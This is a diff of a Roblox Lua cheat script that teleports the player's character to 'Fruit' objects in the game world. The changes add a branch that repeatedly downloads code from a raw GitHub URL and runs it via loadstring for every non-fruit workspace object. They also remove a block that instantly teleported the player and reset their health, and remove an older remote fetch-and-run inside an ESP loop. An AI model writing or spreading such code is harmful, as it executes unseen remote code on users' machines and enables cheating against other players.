@@ -78,15 +78,13 @@ if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyC
     _G.fruit = true
 
 spawn(function()
-    while task.wait(5) do
+    while task.wait(3) do
         pcall(function()
             
                 for i,v in pairs(game.Workspace:GetChildren()) do
              if string.find(v.Name, "Fruit") then
              local pos = v.Handle --check pos
-             
-             if (pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5000 then
-             
+                       
                     local Distance = (pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                   if Distance < 500 then
                   Speed = 150
@@ -105,27 +103,15 @@ spawn(function()
                         TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                         {CFrame =v.Handle.CFrame}
                     ):Play()    
-end end end 
-     for i,v in pairs(game.Workspace:GetChildren()) do
+end  end
+
+for i,v in pairs(game.Workspace:GetChildren()) do
              if string.find(v.Name, "Fruit") then
-             local pos = v.Handle --check pos
-             
-             if (pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 5000 then
-             
-             local Distance = (pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
-                  if Distance >= 0 then
-                  Speed = 9999999
-                  end
-if game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
-game.Players.LocalPlayer.Character.Humanoid.Health = 0
-end
-game:GetService("TweenService"):Create(
-                        game.Players.LocalPlayer.Character.HumanoidRootPart,
-                        TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
-                        {CFrame =v.Handle.CFrame * CFrame.new(0,0,0)}
-                    ):Play()     
-end  end end                                                             
-                                        
+             _G.tes1t = true
+else
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/NTTTTTTTT/Main/main/Svv')))()
+end end
+                                                   
               end) end end)                
              
            spawn(function()
@@ -307,14 +293,7 @@ spawn(function()
                                                                                      
                    end     end end end end) end end)
             
-         spawn(function()
-    while task.wait(5) do
-        pcall(function()           
-for i,v in pairs(game.Workspace:GetChildren()) do
-                    if v:IsA("Tool") or v.Name == "Fruit" then
-                        if not v.Handle:FindFirstChild("FruitESP") then
-                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/NTTTTTTTT/Main/main/Svv')))()
-                        end end end end) end end) 
+         
 
 
 -- code config
